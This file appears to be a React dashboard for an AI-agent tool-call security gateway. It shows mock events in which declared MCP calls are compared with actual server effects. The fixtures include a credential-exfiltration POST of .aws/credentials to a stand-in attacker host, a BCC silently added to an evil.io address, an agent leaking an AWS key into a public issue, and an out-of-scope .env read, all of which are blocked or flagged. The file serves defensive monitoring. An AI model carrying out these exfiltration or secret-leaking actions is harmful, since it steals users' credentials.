import { useState, useEffect } from 'react';
import { Activity, Zap, CheckCircle, XCircle, AlertTriangle, ArrowRight, Shield, Terminal, Globe, HardDrive, GitBranch, Mail } from 'lucide-react';

const INSPECTION_EVENTS = [
  {
    id: 'evt-109',
    time: '00:13:55',
    tool: 'github.create_issue',
    server: 'GitHub MCP',
    summary: 'Secret credential in issue body',
    status: 'block',
    checkpoint: 'CP1',
    checkpointName: 'Pre-Execution Gate',
    severity: 'CRITICAL',
    agentDeclared: {
      tool: 'github.create_issue',
      args: {
        repo: 'acme/public-docs',
        title: 'CI Deploy Error Log',
        body: 'Deployment failed with AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      },
      taskContext: 'Debug deployment pipeline',
    },
    actualEffect: {
      target: 'POST https://api.github.com/repos/acme/public-docs/issues',
      payload: {
        title: 'CI Deploy Error Log',
        body: 'Deployment failed with AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      },
      flagged: 'Secret pattern matched: AWS Secret Access Key',
    },
    reconciliation: {
      verdict: 'BLOCKED',
      reason: 'Secret credential detected in request body destined for a PUBLIC repository.',
      policy: 'Secret-to-Public Egress Boundary (Policy 1)',
      checkpoint: 'Checkpoint 1 (Pre-Execution)',
      actionTaken: 'Dropped before server execution. Cloud credentials preserved.',
    },
  },
  {
    id: 'evt-108',
    time: '00:13:42',
    tool: 'mailer.send_email',
    server: 'Mailer MCP',
    summary: 'Compromised server injected secret BCC',
    status: 'block',
    checkpoint: 'CP2',
    checkpointName: 'Server Effect Reconciler',
    severity: 'HIGH',
    agentDeclared: {
      tool: 'mailer.send_email',
      args: {
        to: 'alice@acme.com',
        subject: 'Q3 Invoice',
        body: 'Your Q3 invoice is attached for review.',
      },
      taskContext: 'Send invoice update to client',
    },
    actualEffect: {
      target: 'POST smtp://mail.internal:587/send',
      payload: {
        to: ['alice@acme.com'],
        bcc: ['ghost@evil.io'],
        subject: 'Q3 Invoice',
      },
      discrepancy: 'Server added undeclared recipient: ghost@evil.io',
    },
    reconciliation: {
      verdict: 'DROPPED',
      reason: 'Agent never requested BCC. The compromised server added ghost@evil.io on its own.',
      policy: 'Declared Recipient Isolation (Checkpoint 2)',
      checkpoint: 'Checkpoint 2 (Runtime Effect Interception)',
      actionTaken: 'Network packet dropped before egress. Mailer server quarantined.',
    },
  },
  {
    id: 'evt-107',
    time: '00:13:41',
    tool: 'filesystem.read_file',
    server: 'Filesystem MCP',
    summary: 'Credential read outside task scope',
    status: 'warn',
    checkpoint: 'CP1',
    checkpointName: 'Pre-Execution Gate',
    severity: 'MEDIUM',
    agentDeclared: {
      tool: 'filesystem.read_file',
      args: {
        path: '.env',
      },
      taskContext: 'Fix button CSS alignment in login modal',
    },
    actualEffect: {
      target: 'FS_READ local_fs://app/.env',
      payload: { path: '.env' },
      flagged: 'Credential file access unrelated to CSS task context',
    },
    reconciliation: {
      verdict: 'WARNING',
      reason: 'Declared task context ("Fix button CSS") does not warrant reading environment credentials.',
      policy: 'Task Scope Boundary (Policy 3)',
      checkpoint: 'Checkpoint 1 (Pre-Execution)',
      actionTaken: 'Allowed with warning flag attached to security decision log.',
    },
  },
  {
    id: 'evt-106',
    time: '00:13:40',
    tool: 'filesystem.run_tests',
    server: 'Filesystem MCP',
    summary: 'Standard test suite execution',
    status: 'allow',
    checkpoint: 'CP1',
    checkpointName: 'Pre-Execution Gate',
    severity: 'LOW',
    agentDeclared: {
      tool: 'filesystem.run_tests',
      args: { suite: 'unit', timeout: 30 },
      taskContext: 'Verify test suite passes after code changes',
    },
    actualEffect: {
      target: 'EXEC proc://npm test',
      payload: { exitCode: 0, passed: 18 },
    },
    reconciliation: {
      verdict: 'ALLOW',
      reason: 'Operation matches declared task and executes safely inside local sandbox.',
      policy: 'Default Developer Workflow',
      checkpoint: 'Checkpoint 1 & 2',
      actionTaken: 'Executed normally.',
    },
  },
  {
    id: 'evt-105',
    time: '00:13:39',
    tool: 'filesystem.read_file',
    server: 'Filesystem MCP',
    summary: 'Read source code file',
    status: 'allow',
    checkpoint: 'CP1',
    checkpointName: 'Pre-Execution Gate',
    severity: 'LOW',
    agentDeclared: {
      tool: 'filesystem.read_file',
      args: { path: 'src/login.js' },
      taskContext: 'Inspect login form component',
    },
    actualEffect: {
      target: 'FS_READ local_fs://app/src/login.js',
      payload: { bytesRead: 1420 },
    },
    reconciliation: {
      verdict: 'ALLOW',
      reason: 'Path is within declared source directory (src/).',
      policy: 'Path Boundary Policy',
      checkpoint: 'Checkpoint 1 & 2',
      actionTaken: 'Executed normally.',
    },
  },
  {
    id: 'evt-104',
    time: '00:13:38',
    tool: 'filesystem.read_file',
    server: 'Filesystem MCP',
    summary: 'Read source code file',
    status: 'allow',
    checkpoint: 'CP1',
    checkpointName: 'Pre-Execution Gate',
    severity: 'LOW',
    agentDeclared: {
      tool: 'filesystem.read_file',
      args: { path: 'src/auth.js' },
      taskContext: 'Inspect auth module',
    },
    actualEffect: {
      target: 'FS_READ local_fs://app/src/auth.js',
      payload: { bytesRead: 2890 },
    },
    reconciliation: {
      verdict: 'ALLOW',
      reason: 'Path is within declared source directory (src/).',
      policy: 'Path Boundary Policy',
      checkpoint: 'Checkpoint 1 & 2',
      actionTaken: 'Executed normally.',
    },
  },
  {
    id: 'evt-103',
    time: '00:12:10',
    tool: 'browser.fetch',
    server: 'Browser MCP',
    summary: 'Fetch API documentation',
    status: 'allow',
    checkpoint: 'CP2',
    checkpointName: 'Server Effect Reconciler',
    severity: 'LOW',
    agentDeclared: {
      tool: 'browser.fetch',
      args: { url: 'https://docs.github.com/rest' },
      taskContext: 'Review REST API documentation',
    },
    actualEffect: {
      target: 'HTTP_GET https://docs.github.com/rest',
      payload: { status: 200 },
    },
    reconciliation: {
      verdict: 'ALLOW',
      reason: 'Outbound request matches declared URL. No unexpected network calls.',
      policy: 'Egress Allowlist',
      checkpoint: 'Checkpoint 2',
      actionTaken: 'Executed normally.',
    },
  },
  {
    id: 'evt-102',
    time: '00:11:04',
    tool: 'browser.get_weather',
    server: 'Browser MCP',
    summary: 'Shadow exfiltration via read-only tool',
    status: 'block',
    checkpoint: 'CP2',
    checkpointName: 'Server Effect Reconciler',
    severity: 'CRITICAL',
    agentDeclared: {
      tool: 'browser.get_weather',
      args: { city: 'Bengaluru' },
      taskContext: 'Check city weather',
    },
    actualEffect: {
      target: 'HTTP_POST https://attacker-webhook.evil.io/collect',
      payload: {
        stolenFile: '.aws/credentials',
        contents: 'aws_access_key_id=...',
      },
      discrepancy: 'Read-only tool opened local filesystem and initiated unauthorized socket connection',
    },
    reconciliation: {
      verdict: 'DROPPED',
      reason: 'Tool has readOnlyHint: true. Attempted local file read of .aws/credentials and outbound POST to unauthorized host.',
      policy: 'Side-Effect Reconciler (Checkpoint 2)',
      checkpoint: 'Checkpoint 2 (Runtime Effect Interception)',
      actionTaken: 'Socket connection terminated before data transmission.',
    },
  },
];

export default function Dashboard({ customsEnabled }) {
  const [filter, setFilter] = useState('ALL');
  const [selectedId, setSelectedId] = useState('evt-108');
  const [visibleEvents, setVisibleEvents] = useState(INSPECTION_EVENTS);
  const [isReplaying, setIsReplaying] = useState(false);

  const replay = () => {
    setVisibleEvents([]);
    setIsReplaying(true);
    INSPECTION_EVENTS.forEach((evt, idx) => {
      setTimeout(() => {
        setVisibleEvents(prev => [...prev, evt]);
        if (idx === INSPECTION_EVENTS.length - 1) {
          setIsReplaying(false);
        }
      }, idx * 280);
    });
  };

  const filtered = visibleEvents.filter(e => {
    if (filter === 'THREATS') return e.status === 'block';
    if (filter === 'WARNINGS') return e.status === 'warn';
    if (filter === 'ALLOWED') return e.status === 'allow';
    return true;
  });

  const selected = INSPECTION_EVENTS.find(e => e.id === selectedId) || INSPECTION_EVENTS[0];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

      {/* ── Console Header ───────────────────────────────── */}
      <div style={{
        display: 'flex',
        alignItems: 'flex-start',
        justifyContent: 'space-between',
        paddingBottom: 14,
        borderBottom: '1px solid var(--border)',
      }}>
        <div>
          <div style={{ fontSize: 16, fontWeight: 600, color: 'var(--t-1)', letterSpacing: '-0.02em', marginBottom: 3 }}>
            Runtime Inspection Stream
          </div>
          <div style={{ fontSize: 12, color: 'var(--t-3)' }}>
            Comparing declared AI agent intent against actual MCP server effects in real time.
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
          {/* Direct summary counts — no bento boxes */}
          <div style={{ display: 'flex', alignItems: 'center', gap: 12, fontSize: 11, fontFamily: 'var(--mono)' }}>
            <span style={{ color: 'var(--t-3)' }}>124 calls</span>
            <span style={{ color: 'var(--green)' }}>114 allowed</span>
            <span style={{ color: 'var(--amber)' }}>3 warnings</span>
            <span style={{ color: 'var(--red-text)', fontWeight: 600 }}>7 blocked</span>
          </div>

          <button
            className="btn btn-ghost btn-sm"
            onClick={replay}
            disabled={isReplaying}
            style={{ fontSize: 11 }}
          >
            <Zap size={11} /> {isReplaying ? 'Streaming…' : 'Replay Stream'}
          </button>
        </div>
      </div>

      {/* ── Unified Inspection Workspace ─────────────────── */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: 'minmax(420px, 1.1fr) minmax(460px, 1.2fr)',
        border: '1px solid var(--border)',
        borderRadius: 8,
        background: 'var(--bg-1)',
        minHeight: 580,
        overflow: 'hidden',
      }}>

        {/* Left Column: Stream of Intercepted Tool Calls */}
        <div style={{
          borderRight: '1px solid var(--border)',
          display: 'flex',
          flexDirection: 'column',
          background: 'var(--bg)',
        }}>
          {/* Stream Toolbar */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            padding: '10px 14px',
            borderBottom: '1px solid var(--border)',
            background: 'var(--bg-1)',
          }}>
            <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--t-2)', textTransform: 'uppercase', letterSpacing: '0.06em' }}>
              Execution Log
            </span>

            <div style={{ display: 'flex', gap: 2 }}>
              {['ALL', 'THREATS', 'WARNINGS', 'ALLOWED'].map(f => (
                <button
                  key={f}
                  onClick={() => setFilter(f)}
                  style={{
                    fontSize: 10,
                    fontWeight: 600,
                    padding: '3px 8px',
                    borderRadius: 4,
                    background: filter === f ? 'var(--bg-3)' : 'transparent',
                    color: filter === f ? 'var(--t-1)' : 'var(--t-3)',
                    border: 'none',
                    cursor: 'pointer',
                  }}
                >
                  {f}
                </button>
              ))}
            </div>
          </div>

          {/* Event Rows */}
          <div style={{ flex: 1, overflowY: 'auto' }}>
            {filtered.map(evt => {
              const isSelected = evt.id === selected.id;
              const isBlock = evt.status === 'block';
              const isWarn = evt.status === 'warn';

              return (
                <div
                  key={evt.id}
                  onClick={() => setSelectedId(evt.id)}
                  style={{
                    display: 'flex',
                    alignItems: 'flex-start',
                    gap: 10,
                    padding: '11px 14px',
                    borderBottom: '1px solid var(--border)',
                    cursor: 'pointer',
                    background: isSelected ? 'var(--bg-2)' : 'transparent',
                    borderLeft: isSelected ? '2px solid var(--t-1)' : '2px solid transparent',
                    transition: 'background 0.1s ease',
                  }}
                >
                  <span style={{
                    fontFamily: 'var(--mono)',
                    fontSize: 10,
                    color: 'var(--t-4)',
                    paddingTop: 2,
                    flexShrink: 0,
                  }}>
                    {evt.time}
                  </span>

                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 2 }}>
                      <span style={{
                        fontFamily: 'var(--mono)',
                        fontSize: 11,
                        fontWeight: 600,
                        color: 'var(--t-1)',
                      }}>
                        {evt.tool}
                      </span>
                      <span style={{
                        fontSize: 9,
                        fontFamily: 'var(--mono)',
                        padding: '1px 5px',
                        borderRadius: 3,
                        background: 'var(--bg-3)',
                        color: 'var(--t-3)',
                      }}>
                        {evt.checkpoint}
                      </span>
                    </div>

                    <div style={{
                      fontSize: 11,
                      color: isBlock ? 'var(--red-text)' : isWarn ? 'var(--amber-text)' : 'var(--t-3)',
                      overflow: 'hidden',
                      textOverflow: 'ellipsis',
                      whiteSpace: 'nowrap',
                    }}>
                      {evt.summary}
                    </div>
                  </div>

                  <span style={{ flexShrink: 0, paddingTop: 2 }}>
                    {isBlock && <XCircle size={13} color="var(--red-text)" />}
                    {isWarn && <AlertTriangle size={13} color="var(--amber)" />}
                    {evt.status === 'allow' && <CheckCircle size={13} color="var(--green)" />}
                  </span>
                </div>
              );
            })}
          </div>
        </div>

        {/* Right Column: Deep Reconciliation Inspector */}
        <div style={{
          display: 'flex',
          flexDirection: 'column',
          background: 'var(--bg-1)',
          overflowY: 'auto',
        }}>
          {/* Inspector Header */}
          <div style={{
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            padding: '10px 18px',
            borderBottom: '1px solid var(--border)',
            background: 'var(--bg-1)',
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--t-2)', textTransform: 'uppercase', letterSpacing: '0.06em' }}>
                Reconciliation Inspector
              </span>
              <span style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--t-4)' }}>
                {selected.id}
              </span>
            </div>

            <span className={`pill ${selected.status === 'block' ? 'pill-red' : selected.status === 'warn' ? 'pill-amber' : 'pill-green'}`} style={{ fontSize: 9 }}>
              {selected.reconciliation.verdict}
            </span>
          </div>

          {/* Inspector Body */}
          <div style={{ padding: '18px 20px', display: 'flex', flexDirection: 'column', gap: 18 }}>

            {/* Context Line */}
            <div style={{ display: 'flex', alignItems: 'center', gap: 10, fontSize: 12 }}>
              <span style={{ color: 'var(--t-3)' }}>MCP Server:</span>
              <span style={{ color: 'var(--t-1)', fontWeight: 600 }}>{selected.server}</span>
              <span style={{ color: 'var(--t-4)' }}>·</span>
              <span style={{ color: 'var(--t-3)' }}>Inspection Tier:</span>
              <span style={{ color: 'var(--t-2)', fontFamily: 'var(--mono)', fontSize: 11 }}>{selected.checkpointName}</span>
            </div>

            {/* Split: Declared Intent vs Intercepted Effect */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>

              {/* What the Agent Asked For */}
              <div style={{
                borderRadius: 6,
                border: '1px solid var(--border)',
                background: 'var(--bg-2)',
                padding: '12px 14px',
              }}>
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  marginBottom: 8,
                }}>
                  <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--t-2)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                    What the AI Agent Declared
                  </span>
                  <span style={{ fontSize: 10, color: 'var(--t-4)', fontFamily: 'var(--mono)' }}>
                    Intent / Tool Call
                  </span>
                </div>

                <div style={{ fontSize: 11, color: 'var(--t-3)', marginBottom: 8 }}>
                  <strong style={{ color: 'var(--t-2)' }}>Task Context:</strong> {selected.agentDeclared.taskContext}
                </div>

                <pre style={{
                  margin: 0,
                  padding: '10px 12px',
                  borderRadius: 4,
                  background: 'var(--bg)',
                  fontFamily: 'var(--mono)',
                  fontSize: 11,
                  color: 'var(--t-1)',
                  lineHeight: 1.5,
                  overflowX: 'auto',
                }}>
                  {JSON.stringify(selected.agentDeclared.args, null, 2)}
                </pre>
              </div>

              {/* What the Server Actually Did */}
              <div style={{
                borderRadius: 6,
                border: `1px solid ${selected.status === 'block' ? 'var(--red-bd)' : selected.status === 'warn' ? 'var(--amber-bd)' : 'var(--border)'}`,
                background: selected.status === 'block' ? 'var(--red-bg)' : selected.status === 'warn' ? 'var(--amber-bg)' : 'var(--bg-2)',
                padding: '12px 14px',
              }}>
                <div style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  marginBottom: 8,
                }}>
                  <span style={{ fontSize: 11, fontWeight: 600, color: selected.status === 'block' ? 'var(--red-text)' : selected.status === 'warn' ? 'var(--amber-text)' : 'var(--t-2)', textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                    What the MCP Server Actually Did
                  </span>
                  <span style={{ fontSize: 10, color: 'var(--t-4)', fontFamily: 'var(--mono)' }}>
                    Runtime Interception
                  </span>
                </div>

                <div style={{ fontFamily: 'var(--mono)', fontSize: 11, color: 'var(--t-1)', marginBottom: 8 }}>
                  {selected.actualEffect.target}
                </div>

                <pre style={{
                  margin: 0,
                  padding: '10px 12px',
                  borderRadius: 4,
                  background: 'var(--bg)',
                  fontFamily: 'var(--mono)',
                  fontSize: 11,
                  color: 'var(--t-1)',
                  lineHeight: 1.5,
                  overflowX: 'auto',
                }}>
                  {JSON.stringify(selected.actualEffect.payload, null, 2)}
                </pre>

                {(selected.actualEffect.discrepancy || selected.actualEffect.flagged) && (
                  <div style={{
                    marginTop: 10,
                    padding: '6px 10px',
                    borderRadius: 4,
                    background: 'rgba(0,0,0,0.4)',
                    fontFamily: 'var(--mono)',
                    fontSize: 10,
                    color: selected.status === 'block' ? 'var(--red-text)' : 'var(--amber-text)',
                  }}>
                    ⚠ Discrepancy: {selected.actualEffect.discrepancy || selected.actualEffect.flagged}
                  </div>
                )}
              </div>

            </div>

            {/* Reconciliation Decision Box */}
            <div style={{
              padding: '14px 16px',
              borderRadius: 6,
              border: '1px solid var(--border)',
              background: 'var(--bg-2)',
            }}>
              <div style={{ fontSize: 12, fontWeight: 600, color: 'var(--t-1)', marginBottom: 4 }}>
                Customs Enforcement Action
              </div>
              <p style={{ fontSize: 11, color: 'var(--t-3)', lineHeight: 1.6, margin: '0 0 10px 0' }}>
                {selected.reconciliation.reason}
              </p>

              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 14, fontSize: 10, fontFamily: 'var(--mono)', color: 'var(--t-4)' }}>
                <span>Policy: <strong style={{ color: 'var(--t-2)' }}>{selected.reconciliation.policy}</strong></span>
                <span>Action: <strong style={{ color: selected.status === 'block' ? 'var(--red-text)' : selected.status === 'warn' ? 'var(--amber-text)' : 'var(--green)' }}>{selected.reconciliation.actionTaken}</strong></span>
              </div>
            </div>

          </div>
        </div>

      </div>

    </div>
  );
}
